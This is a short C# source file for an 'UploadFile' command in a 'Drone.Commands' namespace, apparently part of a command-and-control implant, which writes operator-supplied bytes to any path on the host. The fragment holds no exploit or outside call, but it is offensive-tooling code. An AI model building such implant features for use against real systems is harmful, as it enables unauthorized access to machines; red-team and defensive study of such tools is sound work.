using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class UploadFile : DroneCommand
{
    public override byte Command => 0x1D;
    public override bool Threaded => false;

    public override Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        File.WriteAllBytes(task.Arguments["path"], task.Artefact);
        return Task.CompletedTask;
    }
}